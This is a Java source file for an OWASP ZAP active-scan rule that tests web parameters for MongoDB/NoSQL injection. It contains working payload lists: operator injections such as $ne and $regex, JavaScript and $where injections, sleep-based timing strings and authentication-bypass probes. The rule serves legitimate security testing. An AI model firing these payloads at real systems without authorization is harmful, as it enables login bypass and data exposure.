/*
 * Zed Attack Proxy (ZAP) and its related class files.
 * 
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 * 
 * Copyright 2018 The ZAP Development Team
 *  
 * Licensed under the Apache License, Version 2.0 (the "License"); 
 * you may not use this file except in compliance with the License. 
 * You may obtain a copy of the License at 
 * 
 *   http://www.apache.org/licenses/LICENSE-2.0 
 *   
 * Unless required by applicable law or agreed to in writing, software 
 * distributed under the License is distributed on an "AS IS" BASIS, 
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. 
 * See the License for the specific language governing permissions and 
 * limitations under the License. 
 */
package org.zaproxy.zap.extension.ascanrulesAlpha;

import java.io.IOException;
import java.net.SocketTimeoutException;
import java.time.Instant;
import java.time.temporal.ChronoUnit;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;
import org.apache.commons.httpclient.URI;
import org.apache.commons.httpclient.URIException;
import org.apache.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.control.Control;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.core.scanner.NameValuePair;
import org.parosproxy.paros.network.HttpMessage;
import org.parosproxy.paros.network.HttpRequestHeader;
import org.zaproxy.zap.extension.authentication.ExtensionAuthentication;
import org.zaproxy.zap.model.Context;
import org.zaproxy.zap.model.Tech;
import org.zaproxy.zap.model.TechSet;
import net.sf.json.JSONException;
import net.sf.json.JSONObject;

/**
 * @author l.casciaro
 */
public class MongoDbInjection extends AbstractAppParamPlugin {

	// Prefix for internationalised messages used by this rule
	private static final String MESSAGE_PREFIX = "ascanalpha.mongodb.";
	private static final String ALL_DATA_ATTACK = "alldata";
	private static final String JS_ATTACK = "js";
	private static final String CRASH_ATTACK = "crash";
	private static final String SLEEP_ATTACK ="sleep";
	private static final String JSON_ATTACK = "json";
	private static final String AUTH_BYPASS_ATTACK = "authbypass";
	private static final String MONGO_TOKEN ="OWASP_ZAP_TOKEN_INJECTION";
	private static int SLEEP_TIME_SHORT;
	private static int SLEEP_TIME_LONG;
	private static final int DELTA_TIME=100;
	private final List<Pattern> errorPatterns = initPattern(BINGO_MATCHING);
	private static final String[] ALL_DATA_PARAM_INJECTION = new String[] {"[$ne]", "[$regex]", "[$gt]"};
	private static final String[] ALL_DATA_VALUE_INJECTION = new String[]  {"", ".*", "0"};
	private static String[] CRASH_INJECTION = new String[] {"\"", "'", "//", "});",");"};
	private static final String[] JS_INJECTION = {
		"'; return (true); var notReaded='",
		"'); print("+MONGO_TOKEN+"); print('",
		"_id);}, function(kv) { return 1; }, { out: 'x'}); print('Injection'); "+
		"return 1; db.noSQL_injection.mapReduce(function() { emit(1,1",
		"true, $where: '1 == 1'"};
	private static final String[][] TIMED_INJECTION = {{"\"'); sleep("+SLEEP_TIME_SHORT+"); print('\"",
		"\"'); sleep("+SLEEP_TIME_LONG+"); print('\""}, {"'; sleep("+SLEEP_TIME_SHORT+"); var x='",
			"'; sleep("+SLEEP_TIME_LONG+"); var x='"}};
	private static final String[][] JSON_INJECTION = {{"$ne", "0"}, {"$gt", ""}, {"$regex", ".*"}};
	private static final String[] BINGO_MATCHING =  {"mongoDB", "MongoDB", "exception: SyntaxError: Unexpected",
			"exception 'MongoResultException'", MONGO_TOKEN, "Unexpected string at $group reduce setup"};
	private static final String JSON_EX_LOG = "try to convert the payload in json format";
	private static final String IO_EX_LOG = "try to send an http message";
	private static final String URI_EX_LOG = "try to get the message's Uri";
	private static final Logger LOG = Logger.getLogger(MongoDbInjection.class);

	// state variables
	private boolean isJsonPayload;
	private boolean doUnknownAlert, doAllDataScan, doCrashScan, doJsScan, doTimedScan, doJsonScan, doCounterProof,
					doAuthBypass;

	@Override
	public int getCweId() {
		return 943;
	}

	@Override
	public int getWascId() {
		return 19;
	}

	public int getId() {
		return 40033;
	}

	public Tech getTech() {
		//TODO change in Tech.MongoDB as soon as available
		return Tech.Db;
	}

	@Override
	public boolean targets(TechSet technologies) {
		//TODO change in Tech.MongoDB as soon as available
		return technologies.includes(Tech.Db);
	}

	@Override
	public String getName() {
		return Constant.messages.getString(MESSAGE_PREFIX + "name");
	}

	@Override
	public String getDescription() {
		return Constant.messages.getString(MESSAGE_PREFIX + "desc");
	}

	@Override
	public int getCategory() {
		return Category.INJECTION;
	}

	@Override
	public String getSolution() {
		return Constant.messages.getString(MESSAGE_PREFIX + "soln");
	}

	@Override
	public String getReference() {
		return Constant.messages.getString(MESSAGE_PREFIX + "refs");
	}

	@Override
	public String[] getDependency() {
		return new String[] {};
	}

	public String getExtraInfo(String attack) {
		return Constant.messages.getString(MESSAGE_PREFIX + "extrainfo." + attack);
	}

	@Override
	public void init() {
		if (LOG.isDebugEnabled()) {
			LOG.debug("Initialising MongoDB penertration tests");
		}
		if (this.getAttackStrength() == AttackStrength.LOW) {
			SLEEP_TIME_SHORT = 300;
			SLEEP_TIME_LONG = 600;
			doUnknownAlert = false;
			doCrashScan = false;
			doJsScan = true;
			doAllDataScan = true;
			doTimedScan = true;
			doJsonScan = true;
			doCounterProof = false;
			doAuthBypass = false;
		}
		else if (this.getAttackStrength() == AttackStrength.MEDIUM) {
			SLEEP_TIME_SHORT = 400;
			SLEEP_TIME_LONG = 800;
			doUnknownAlert = false;
			doCrashScan = true;
			doJsScan =true;
			doAllDataScan = true;
			doTimedScan = true;
			doJsonScan = true;
			doCounterProof = false;
			doAuthBypass = true;
		}
		else if (this.getAttackStrength() == AttackStrength.INSANE) {
			SLEEP_TIME_SHORT = 500;
			SLEEP_TIME_LONG = 1500;
			doUnknownAlert = true;
			doCrashScan = true;
			doJsScan = true;
			doAllDataScan = true;
			doTimedScan = true;
			doJsonScan = true;
			doCounterProof = true;
			doAuthBypass = true;
		}
	}

	@Override
	public void scan(HttpMessage msg, NameValuePair originalParam) {
		//TODO add TYPE_JSON control as soon as available
		isJsonPayload = originalParam.getType() == NameValuePair.TYPE_POST_DATA; //& originalParam.getType() == NameValuePair.TYPE_JSON;
		super.scan(msg, originalParam);
	}

	@Override
	public void scan(HttpMessage msg, String param, String value) {
		if(!inScope(getTech())){
			return;
		}
		if (LOG.isDebugEnabled()) {
			LOG.debug("\nScannning URL ["+msg.getRequestHeader().getMethod()+"] ["+msg.getRequestHeader().getURI()+
					"] on param: ["+param+"] with value: ["+value+"] for MongoDB Injection");
		}

		if(doAllDataScan) {
			urlScan(msg, param, value, ALL_DATA_PARAM_INJECTION, ALL_DATA_VALUE_INJECTION, ALL_DATA_ATTACK, false);
		}
		// log already printed
		if(isStop()) { return; }
		if(doCrashScan) { urlScan(getNewMsg(), param, value, null, CRASH_INJECTION, CRASH_ATTACK, true); }
		if(isStop()) { return; }
		if(doJsScan) { urlScan(getNewMsg(), param, value, null, JS_INJECTION, JS_ATTACK, false); }
		if(isStop()) { return; }
		if(doTimedScan) { timedScan(getNewMsg(), param, value, TIMED_INJECTION, SLEEP_ATTACK); }
		if(isStop()) { return; }
		doJsonScan &= isJsonPayload;
		if(doJsonScan) { jsonScan(getNewMsg(), param, value, JSON_INJECTION, ALL_DATA_ATTACK); }
	}

	private void urlScan(HttpMessage msg, String param, String value, String[] paramInjection, String[] valueInj,
			String typeAttack, boolean onlyExactError) {
		int index = 0;
		for(String vi : valueInj) {
			if(isStop()) {
				if (LOG.isDebugEnabled()) { LOG.debug("Stopping the scan due to a user request"); }
				return;
			}
			if (LOG.isDebugEnabled()) {
				LOG.debug("\nTrying the MongoDBInjection \""+typeAttack+"\" attack with the value: "+vi);
			}
			try {
				if(paramInjection!=null) {
					param += paramInjection[index++];
				}
				msg = sendNewMsg(param, vi);
				if(isBingo(getBaseMsg(), msg, param, vi, typeAttack, onlyExactError)) {
					// The onlyExactError flag is true when you insert strings to break the database, the result of this
					// penetration test difficulty will be an authentication bypassing, so it was excluded from the
					// checkAuthBypass(...) test.
					if(!onlyExactError && doAuthBypass) {
						String attack = paramInjection!=null ? paramInjection[index-1] + vi : vi;
						checkAuthBypass(getBaseMsg(), msg, param, attack);
					}
					break;
				}
			}catch(IOException ex) {
				printLogException(ex, IO_EX_LOG);
				continue;
			}
		}
	}

	private void timedScan(HttpMessage msg, String param, String value, String[][] sleepInjection, String sleepAttack) {
		if(isStop()) {
			if (LOG.isDebugEnabled()) { LOG.debug("Stopping the scan due to a user request"); }
			return;
		}
		long intervalBaseMessage, intervalInjectedMessage;
		Instant start;
		start = Instant.now();
		try {
			// Here the sendAndrReceive() function could be called directly but in this way the next comparison between 
			// times is more accurate.
			sendNewMsg(param, value);
		} catch (IOException ex) {
			printLogException(ex, IO_EX_LOG);
			return;
		}
		intervalBaseMessage = ChronoUnit.MILLIS.between(start, Instant.now());
		int index = 0;
		while(index<sleepInjection.length) {
			if(isStop()) {
				if (LOG.isDebugEnabled()) { LOG.debug("Stopping the scan due to a user request"); }
				return;
			}
			if (LOG.isDebugEnabled()) {
				LOG.debug("\nTrying the MongoDBInjection \""+sleepAttack+"\" attack with the value: "+
						sleepInjection[index][0]);
			}
			try {
				start = Instant.now();
				sendNewMsg(param, sleepInjection[index][0]);
				intervalInjectedMessage = ChronoUnit.MILLIS.between(start, Instant.now());
				if(isTimedInjected(intervalBaseMessage,intervalInjectedMessage, SLEEP_TIME_SHORT)) {
					// try for a longer time to exclude transmission delays
					if(isStop()) {
						if (LOG.isDebugEnabled()) { LOG.debug("Stopping the scan due to a user request"); }
						return;
					}
					start = Instant.now();
					msg = sendNewMsg(param, sleepInjection[index][1]);
					intervalInjectedMessage = ChronoUnit.MILLIS.between(start, Instant.now());

					if(isTimedInjected(intervalBaseMessage,intervalInjectedMessage, SLEEP_TIME_LONG)) {
						bingo(Alert.RISK_HIGH, Alert.CONFIDENCE_HIGH, getName(), getDescription(), null,
								param, sleepInjection[index][1], getExtraInfo(sleepAttack), getSolution(), msg);
						break;
					}
				}
				//only in case of no SocketTimeoutException exception
				index++;
			} catch (SocketTimeoutException ex) {
				printLogException(ex, IO_EX_LOG+", trying with the lowest interval (600 ms)");
				SLEEP_TIME_SHORT = 300;
				SLEEP_TIME_LONG = 600;
			} catch (IOException ex) {
				printLogException(ex, IO_EX_LOG);
				return;
			}
		}
	}

	private void jsonScan(HttpMessage msg, String param, String value, String[][] allDataInjection,
			String allDataAttack) {
		for(String[] jpv : allDataInjection) {
			try {
				if(isStop()) {
					if (LOG.isDebugEnabled()) { LOG.debug("Stopping the scan due to a user request"); }
					return;
				}
				if (LOG.isDebugEnabled()) {
					LOG.debug("\nTrying the MongoDBInjection \""+allDataAttack+"\" attack with the value: "+jpv);
				}
				value = getParamJsonString(param, jpv);
				msg.getRequestHeader().setHeader(HttpRequestHeader.CONTENT_TYPE, "application/json");
				msg.getRequestHeader().setMethod(HttpRequestHeader.POST);
				setParameter(msg, param, value);
				sendAndReceive(msg, false);
				if(isBingo(getBaseMsg(), msg, JSON_ATTACK, param, value, false)) {
					if(doAuthBypass) {
						checkAuthBypass(getBaseMsg(), msg, param, jpv[0]+jpv[1]);
					}
					break;
				}
			} catch (JSONException ex) {
				printLogException(ex, JSON_EX_LOG);
				continue;
			} catch (IOException ex) {
				printLogException(ex, IO_EX_LOG);
				continue;
			}
		}
	}

	private boolean isBingo(HttpMessage originalMsg, HttpMessage injectedMsg, String param, String valueInj,
			String typeAttack, boolean onlyExactMatch) {
		String originalText = originalMsg.getResponseBody().toString();
		String injectedText = injectedMsg.getResponseBody().toString();
		if(originalText.equals(injectedText)) {
			return false;
		}
		else {
			// The difference between the base response body and the after injecting one is for the only value passed
			// as input. So it could be a (uncommon) false positive result. For example the server could be response:
			// " @valueInj (or @TOKEN) doesn't exist, make sure you ... ".
			if(differOnlyForInput(originalText, injectedText, valueInj, MONGO_TOKEN)) {
				bingo(Alert.RISK_LOW, Alert.CONFIDENCE_LOW, getName(), getDescription(), null, param, valueInj,
						getExtraInfo(typeAttack), getSolution(), injectedMsg);
				// continue to scan
				return false;
			}
			StringBuilder sb = new StringBuilder();
			// If the response message contains one of the note patterns then it is probable that the application has
			// a well-noted vulnerability.
			for(Pattern p : errorPatterns) {
				if(matchBodyPattern(injectedMsg, p, sb)) {
					bingo(Alert.RISK_HIGH, Alert.CONFIDENCE_MEDIUM, getName(), getDescription(), null, param, valueInj,
							getExtraInfo(typeAttack), getSolution(), injectedMsg);
					return true;
				}
			}
			// Unknown vulnerability or obtained potentially sensitive data
			if(!onlyExactMatch && doUnknownAlert) {
				// Get more confidence - if user has stopped, the event is handled in the calling method after alerting
				// the vulnerability already found (the bingo at the end)
				if(doCounterProof && !isStop()) {
					try {
						HttpMessage counterProof = sendNewMsg(param, MONGO_TOKEN);
						if(!injectedText.equals(counterProof.getRequestBody().toString())){
							bingo(Alert.RISK_MEDIUM, Alert.CONFIDENCE_HIGH, getName(), getDescription(), null, param,
									valueInj, getExtraInfo(typeAttack), getSolution(), injectedMsg);
							return true;
						}
						else {
							return false; 
						}
					} catch(IOException ex) {
						printLogException(ex, IO_EX_LOG + "in the counterProof test");
					}
				}
				bingo(Alert.RISK_MEDIUM, Alert.CONFIDENCE_MEDIUM, getName(), getDescription(), null, param,
						valueInj, getExtraInfo(typeAttack), getSolution(), injectedMsg);
				return true;
			}
			return false;
		}
	}

	static boolean differOnlyForInput(String originalMsg, String injectedMsg, String valueBase,
			String valueInj) {
		String extractString1, extractString2;
		int index = originalMsg.lastIndexOf(injectedMsg);
		if(index> -1) {
			extractString1 = injectedMsg.substring(index, index+valueInj.length());
			extractString2 = injectedMsg.substring(index, index+ valueBase.length());
			if(extractString1.equals(valueInj) && extractString2.equals(valueBase)) {
				return true;
			}
		}
		return false;
	}

	public void checkAuthBypass(HttpMessage msg, HttpMessage injectedMsg, String param, String valueInj) {
		if(isStop()) {
			if (LOG.isDebugEnabled()) { LOG.debug("Stopping the scan due to a user request"); }
			return;
		}
		if (LOG.isDebugEnabled()) {
			LOG.debug("\nPenetration gone well, check if it's an authentication page");
		}
		ExtensionAuthentication extAuth = (ExtensionAuthentication) Control.getSingleton()
				.getExtensionLoader().getExtension(ExtensionAuthentication.NAME);
		if (extAuth != null) {
			URI requestUri = msg.getRequestHeader().getURI();
			try {
				List<Context> contextList = extAuth.getModel().getSession().getContextsForUrl(requestUri.getURI());
				for (Context context : contextList) {
					URI loginUri = extAuth.getLoginRequestURIForContext(context);
					if (loginUri != null) {
						if (requestUri.getScheme().equals(loginUri.getScheme())
								&& requestUri.getHost().equals(loginUri.getHost())
								&& requestUri.getPort() == loginUri.getPort()
								&& requestUri.getPath().equals(loginUri.getPath())) {

							bingo(Alert.RISK_HIGH, Alert.CONFIDENCE_MEDIUM, getName(), getDescription(), null, param,
									valueInj, getExtraInfo(AUTH_BYPASS_ATTACK), getSolution(), injectedMsg);
							break;
						}
					}
				}
			} catch(URIException ex) {
				printLogException(ex, URI_EX_LOG);
			}
		}
	}

	private boolean isTimedInjected(long intervalBaseMessage, long intervalInjectedMessage, int sleep) {
		long diff=intervalInjectedMessage-intervalBaseMessage;
		return diff>=sleep-DELTA_TIME;
	}

	private static List<Pattern> initPattern(String[] eb) {
		List<Pattern> list =  new ArrayList<>();
		for(String regex: eb) {
			list.add(Pattern.compile(regex, AbstractAppParamPlugin.PATTERN_PARAM));
		}
		return list;
	}

	private String getParamJsonString(String param, String[] params) throws JSONException {
		JSONObject internal = new JSONObject(),
				   external = new JSONObject();
    	internal.put(params[0] , params[1]);
    	external.put(param, internal);
		return external.toString();
	}

	private HttpMessage sendNewMsg(String param, String value) throws IOException {
		HttpMessage newMsg = getNewMsg();
		setParameter(newMsg, param, value);
		sendAndReceive(newMsg, false);
		return newMsg;
	}

	private void printLogException(Exception ex, String info) {
		if (LOG.isDebugEnabled()) {
			LOG.debug("Caught " + ex.getClass().getName() + " " + ex.getMessage() +
					" when "+info);
		}
	}
}